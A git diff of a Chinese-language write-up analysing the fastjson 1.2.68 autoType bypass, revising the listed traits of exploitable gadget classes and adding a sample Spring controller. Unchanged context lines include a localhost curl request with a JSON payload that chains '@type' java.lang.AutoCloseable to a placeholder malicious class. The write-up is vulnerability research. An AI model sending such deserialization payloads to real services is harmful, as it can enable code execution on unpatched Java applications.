@@ -32,7 +32,7 @@ fastjson 1.2.68 版本爆出高危漏洞，本次通过寻找改漏洞触发机�
 
 得到 0xD59EE91F0B09EA01L 为 oracle.jms.AQ
 
-但黑名单需要开启 autoType 才能使用，所以该重大漏洞与 oracle.jms.AQ 无关
+但黑名单需要开启 autoType 才能使用，所以该重大漏洞大概率与 oracle.jms.AQ 无关
 
 2. exceptClass 替换为 exceptHash 并添加了3个
 
@@ -105,9 +105,9 @@ Object result = JSON.parseObject("\"@type\":\"io.github.tanghuibo.fastjsontest.b
 
 绕过此次漏洞是由该方式造成的，那么该类需要有如下特征
 
-1. 拥有公开的无参构造方法
-2. getXXX 或 setXXX 或无参构造方法能触发危险操作
-3. 实现 AutoType
+1. 拥有公开的构造方法且非抽象类
+2. getXXX 或 setXXX 或构造方法能触发危险操作
+3. 实现 AutoCloseable
 4. 不在 fastjson 的黑名单中
 5. 在 java 标准库中或常用的第三方库中
 
@@ -134,6 +134,15 @@ public HttpMessageConverter configureMessageConverters() {
 
 2. 拥有一个使用 @RequestBody 的 Controller (常见)
 
+```java
+@PostMapping("case1")
+public TestCase1Vo test1(@RequestBody TestCase1Request request) {
+    TestCase1Vo vo = new TestCase1Vo();
+    vo.setMessage(request.getMessage());
+    return vo;
+}
+```
+
 3. 拥有满足高危漏洞的类(比较难找，这里用 AutoCloseableBadCode 代替)
 
 正常请求:
@@ -148,7 +157,7 @@ curl --location --request POST 'http://127.0.0.1:8080/test/case1' --header 'Cont
 curl --location --request POST 'http://127.0.0.1:8080/test/case1' --header 'Content-Type: application/json' --data-raw '{"data": {"@type":"java.lang.AutoCloseable","@type":"io.github.tanghuibo.fastjsontest.badcode.AutoCloseableBadCode","name":"test"}, "msg": "test"}'
 ```
 
-此时就会执行 AutoCloseableBadCode.setName (目标类可以没有 setData 和 getData 属性)
+此时就会执行 AutoCloseableBadCode.setName (目标类可以没有 setData 和 getData 方法)
 
 # 总结
 
